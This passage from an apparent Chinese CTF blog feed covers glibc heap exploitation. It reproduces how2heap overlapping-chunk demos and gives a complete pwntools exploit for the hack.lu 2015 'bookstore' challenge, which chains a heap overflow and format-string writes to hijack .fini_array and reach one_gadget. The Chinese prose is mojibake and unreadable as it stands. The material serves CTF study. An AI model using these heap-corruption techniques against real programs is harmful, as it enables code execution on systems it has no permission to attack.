title="2.29ä»¥å"></a>2.29ä»¥å</h2><p>2.29å¢åŠ äº†å¯¹top chunkçš„sizeçš„åˆæ³•æ€§çš„æ£€æŸ¥ï¼Œè¿™ä¸ªæ–¹æ³•å°±å¤±æ•ˆäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br><br>  victim = av-&gt;top;<br>  size = chunksize (victim);<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>overlapping chunks</title>
    <link href="/2023/02/05/overlapping-chunks/"/>
    <url>/2023/02/05/overlapping-chunks/</url>
    
    <content type="html"><![CDATA[<p>overlappingï¼æŒºç®€å•çš„ï¼Œä¾‹é¢˜æœ‰ç‚¹ç¦»è°±ä½†ä¹Ÿæ¶¨äº†ä¸å°‘å§¿åŠ¿</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>åœ¨2.29unsorted binå¢åŠ chunkçš„sizeæ£€æŸ¥ä¹‹å‰ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶next chunkçš„sizeé‚£å°±èƒ½é€ æˆå †å—é‡å </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨ä¸€"><a href="#åˆ©ç”¨ä¸€" class="headerlink" title="åˆ©ç”¨ä¸€"></a>åˆ©ç”¨ä¸€</h1><h2 id="2-26ä»¥å‰"><a href="#2-26ä»¥å‰" class="headerlink" title="2.26ä»¥å‰"></a>2.26ä»¥å‰</h2><p>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span>&#123;<br><br><br><span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4;<br><br>p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">free</span>(p2);<br><br><span class="hljs-type">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;<br><span class="hljs-type">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;<br><br>*(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// we are overwriting the &quot;size&quot; field of chunk p2</span><br><br>p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br><span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br><span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><img src="/2023/02/05/overlapping-chunks/1.jpg" class title="æ­¥éª¤ä¸€"><p>æˆ‘ä»¬å°±èƒ½é€šè¿‡p4æ§åˆ¶p3</p><h2 id="2-27-2-28"><a href="#2-27-2-28" class="headerlink" title="2.27-2.28"></a>2.27-2.28</h2><p>æœ‰äº†tcacheï¼Œç”³è¯·çš„sizeè¦å¤§äºtcacheçš„èŒƒå›´</p><h2 id="2-29ä»¥å"><a href="#2-29ä»¥å" class="headerlink" title="2.29ä»¥å"></a>2.29ä»¥å</h2><p>æ§åˆ¶top chunkçš„preinuseä½å’Œpresizeè¿™ä¸ªæ–¹æ³•ä¾ç„¶èƒ½å¤Ÿä½¿ç”¨</p><h1 id="åˆ©ç”¨äºŒ"><a href="#åˆ©ç”¨äºŒ" class="headerlink" title="åˆ©ç”¨äºŒ"></a>åˆ©ç”¨äºŒ</h1><p>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2hwapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <br>  <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br>  <span class="hljs-type">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<span class="hljs-comment">//0x3e8</span><br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  real_size_p1 = malloc_usable_size(p1);<br>  real_size_p2 = malloc_usable_size(p2);<br>  real_size_p3 = malloc_usable_size(p3);<br>  real_size_p4 = malloc_usable_size(p4);<br>  real_size_p5 = malloc_usable_size(p5);<br><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br><br>  <span class="hljs-built_in">free</span>(p4);<br><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>; <span class="hljs-comment">//&lt;--- BUG HERE </span><br><br>  <span class="hljs-built_in">free</span>(p2);<br><br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br>  real_size_p6 = malloc_usable_size(p6);<br><br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);  <br>&#125;<br></code></pre></td></tr></table></figure><p>ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><img src="/2023/02/05/overlapping-chunks/2.jpg" class title="æ­¥éª¤äºŒ"><p>è§¦å‘åˆå¹¶èƒ½å¤Ÿæ§åˆ¶æ›´å¤šçš„chunkï¼Œä¸”æ‰€æœ‰ç‰ˆæœ¬éƒ½å¯ç”¨</p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="hack-lu-CTF-2015-bookstore"><a href="#hack-lu-CTF-2015-bookstore" class="headerlink" title="hack.lu CTF 2015-bookstore"></a>hack.lu CTF 2015-bookstore</h2><h3 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h3><p>æ¼æ´æŒºå¤šï¼Œä¸»è¦åˆ©ç”¨çš„æœ‰ä¸¤ä¸ª</p><ul><li>editå‡½æ•°ä¸­çš„æ•°æ®è¯»å…¥æ²¡æœ‰é•¿åº¦é™åˆ¶<img src="/2023/02/05/overlapping-chunks/edit.png" class title="edit"></li><li>æœ€åæœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´<img src="/2023/02/05/overlapping-chunks/printf.png" class title="printf"></li></ul><p>æ¼æ´å¾ˆå¤šçš„åŒæ—¶é™åˆ¶ä¹Ÿå¾ˆå¤šï¼Œåªæœ‰ä¸¤ä¸ª0x90çš„å †å—å¯ä»¥ç¼–è¾‘å’Œé‡Šæ”¾ï¼Œä»¥åŠèƒ½ç”³è¯·ä¸€ä¸ª0x140çš„å †å—ï¼Œä½†ç”³è¯·å®Œä¹‹åä¼šç›´æ¥é€€å‡º</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>è¦è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²å°±è¦æ§åˆ¶destã€‚å¦‚æœæˆ‘ä»¬é€šè¿‡edit(order2)æ¥æ§åˆ¶destï¼Œeditå®Œåˆä¼šåœ¨destå¤„å†™â€Your order is submitted!\nâ€ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦è€ƒè™‘ç”¨åˆ«çš„æ–¹æ³•æ§åˆ¶destï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>free(order2)</li><li>é€šè¿‡order1çš„æº¢å‡ºæ›´æ”¹order2çš„sizeä¸º0x151ï¼Œè¿™æ ·æ‰§è¡Œsubmitè¿‡ç¨‹æ—¶ä½¿ç”¨çš„chunk order3å®é™…ä¸Šæ˜¯order2</li><li>ä¹‹åä¼šå…ˆæŠŠorder1çš„å†…å®¹copyåˆ°order2ä¸­ï¼Œå†æŠŠorder2çš„å†…å®¹ï¼ˆè¿˜æ˜¯order1çš„å†…å®¹ï¼‰copyåˆ°order2ä¸­ï¼Œæ‰€ä»¥åªè¦order1çš„dataè¶³å¤Ÿé•¿å°±èƒ½æº¢å‡ºåˆ°destä¸­ï¼Œå¦‚æœåœ¨order1ä¸­å†™å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå°±èƒ½è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li></ul><p>è¿˜è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å¦‚ä½•åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿”å›mainå‡½æ•°ï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œmainå‡½æ•°çš„æ—¶å€™å¦‚ä½•æ‰§è¡Œone_gadget<br>ç¬¬ä¸€ä¸ªé—®é¢˜æˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ«æŒfini_arrayå®ç°ï¼ˆé€šè¿‡è¿™é“é¢˜æ¶¨çš„æ–°å§¿åŠ¿ï¼‰<br>ç¬¬äºŒä¸ªé—®é¢˜æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³„éœ²æ ˆåœ°å€ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¿®æ”¹è¿”å›åœ°å€ä¸ºone_gadgetå®ç°ï¼ˆæ‰€ä»¥è¯´è¿™æ˜¯é“æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ä¸æ˜¯é“å †é¢˜(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»ï¼‰</p><h4 id="fini-array"><a href="#fini-array" class="headerlink" title="fini_array"></a>fini_array</h4><p>å…ˆæ‹ä¸€éç¨‹åºçš„è¿è¡Œè¿‡ç¨‹<br>ä¼—æ‰€å‘¨çŸ¥ï¼Œmainå¹¶ä¸æ˜¯ç¨‹åºçœŸæ­£çš„å…¥å£ï¼ŒçœŸæ­£çš„å…¥å£åº”è¯¥æ˜¯start</p><img src="/2023/02/05/overlapping-chunks/start.png" class title="start"><p>0x400780å°±æ˜¯bookstoreç¨‹åºçš„startå‡½æ•°<br>gdbè·Ÿè¸ªä¸€ä¸‹ç¨‹åºçš„è¿‡ç¨‹</p><ul><li>startå‡½æ•°é¦–å…ˆè°ƒç”¨äº†__libc_start_main<img src="/2023/02/05/overlapping-chunks/call_libc.png" class title="call_libc"></li><li>__libc_start_mainæœ‰ä¸€ä¸ªcall rbpçš„è¿‡ç¨‹<br>å®é™…è°ƒç”¨çš„æ˜¯0x400cb0ï¼Œå³initå‡½æ•°<img src="/2023/02/05/overlapping-chunks/call_rbp.png" class title="call_rbp"><img src="/2023/02/05/overlapping-chunks/init.png" class title="init"></li><li>initå‡½æ•°ä¸­æœ‰ä¸ªcall qword ptr [r12 + rbx*8]çš„è¿‡ç¨‹ï¼Œæ­¤æ—¶r12ä¸­å­˜çš„æ˜¯0x6011b0ï¼Œrbxä¸­å­˜çš„æ˜¯0<img src="/2023/02/05/overlapping-chunks/call_r12.png" class title="call_r12">0x6011b0å®é™…ä¸Šå°±æ˜¯.init_arrayæ®µï¼Œå³è°ƒç”¨å‡½æ•°sub_400850<img src="/2023/02/05/overlapping-chunks/init_array.png" class title="init_array"></li><li>__libc_start_mainæ‰§è¡Œå®Œinitå‡½æ•°åæœ‰ä¸€ä¸ªcall raxï¼Œæ­¤æ—¶raxå­˜çš„æ˜¯0x400a39ï¼Œå°±æ˜¯æ‰§è¡Œmainå‡½æ•°äº†<img src="/2023/02/05/overlapping-chunks/call_rax.png" class title="call_rax"></li><li>__libc_start_mainç»“æŸmainå‡½æ•°åè°ƒç”¨exit<img src="/2023/02/05/overlapping-chunks/call_exit.png" class title="call_exit"></li><li>exitè°ƒç”¨çš„__run_exit_handlerså‡½æ•°æœ‰ä¸€ä¸ªcall rdxçš„è¿‡ç¨‹ï¼Œrdxå­˜çš„æ˜¯_dl_finiå‡½æ•°<img src="/2023/02/05/overlapping-chunks/call_rdx.png" class title="call_rdx">ä½†ä¸çŸ¥é“ä¸ºå•¥å®é™…æ‰§è¡Œçš„æ˜¯sub_0x400830ï¼ˆæºç å¥½å¤æ‚çœ‹ä¸æ‡‚ï¼‰ï¼Œå°±æ˜¯.fini_arrayæ®µçš„å†…å®¹<img src="/2023/02/05/overlapping-chunks/fini_array.png" class title="fini_array"></li><li>ä¹‹åç¨‹åºå°±ç»“æŸäº†<br>è™½ç„¶æœ‰ç‚¹äº‘é‡Œé›¾é‡Œï¼Œä½†åˆ©ç”¨æ–¹æ³•ä»¥åŠå¾ˆæ¸…æ¥šäº†ï¼Œå°±æ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹.fini_arrayæ®µçš„å†…å®¹ä¸ºmainå‡½æ•°çš„åœ°å€<br>åœ¨No RELROçš„æƒ…å†µä¸‹.fini_arrayæ®µæ˜¯å¯å†™çš„<img src="/2023/02/05/overlapping-chunks/checksec.png" class title="checksec"><img src="/2023/02/05/overlapping-chunks/vmmap.png" class title="vmmap"></li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit1</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter first order:\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit2</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter second order:\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del1</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del2</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>(<span class="hljs-params">command</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>+command)<br><br>p=process(<span class="hljs-string">&#x27;./bookstore&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>del2()<br>edit1(<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;%2617c%13$hn%31$p%28$p&#x27;</span>+<span class="hljs-string">b&#x27;Q&#x27;</span>*(<span class="hljs-number">0x60</span>-<span class="hljs-number">34</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">28</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x151</span>))<br>submit(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x6011b8</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)[:-<span class="hljs-number">2</span>]<br>ss=p.recvuntil(<span class="hljs-string">b&#x27;Q&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>libcbase=<span class="hljs-built_in">int</span>(s,<span class="hljs-number">16</span>)-libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]-<span class="hljs-number">240</span><br>stack=<span class="hljs-built_in">int</span>(ss,<span class="hljs-number">16</span>)-<span class="hljs-number">0xf50</span>+<span class="hljs-number">0xd68</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>one_addr=p64(libcbase+<span class="hljs-number">0x45206</span>)<br>x=one_addr[<span class="hljs-number">2</span>]<br>p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>payload=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%13$hhn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0x5206</span>-x)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%14$hn&#x27;</span><br>edit1(<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x10</span>+payload.encode()+<span class="hljs-string">b&#x27;Q&#x27;</span>*(<span class="hljs-number">0x60</span>-<span class="hljs-number">12</span>-<span class="hljs-built_in">len</span>(payload))+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">28</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x151</span>))<br>submit(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span>+p64(stack+<span class="hljs-number">2</span>)+p64(stack))<br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of lore</title>
    <link href="/2023/02/05/house-of-lore/"/>
    <url>/2023/02/05/house-of-lore/</url>
    
    <content type="html"><![CDATA[<p>æ²¡æœåˆ°æœ‰ä»€ä¹ˆä¾‹é¢˜ï¼Œå…ˆç ”ç©¶ä¸‹å†è¯´</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>å®ç°æ•ˆæœä¸ºåˆ†é…chunkåˆ°æ ˆä¸Š<br>small binçš„æ£€æŸ¥ä¸å¤šï¼š<br>_int_mallocä»small binä¸­å–chunkæ—¶ï¼Œæ£€æŸ¥å‰ä¸€ä¸ªchunkçš„è¿æ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = victim-&gt;bk;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>&#123;<br>       errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>       <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»small binä¸­å–chunkçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              bck = victim-&gt;bk;<br><span class="hljs-comment">//å–binä¸­æœ€åä¸€ä¸ªchunkï¼Œç”±bin-&gt;bkå†³å®š</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>              set_inuse_bit_at_offset (victim, nb);<br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><span class="hljs-comment">//å–ä¸‹victimåbin-&gt;bkç”±victim-&gt;bkå†³å®š</span><br><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="2-26ä»¥å‰"><a href="#2-26ä»¥å‰" class="headerlink" title="2.26ä»¥å‰"></a>2.26ä»¥å‰</h2><p>å®éªŒä»£ç å¦‚ä¸‹ï¼ˆæ¥è‡ªhow2heapï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 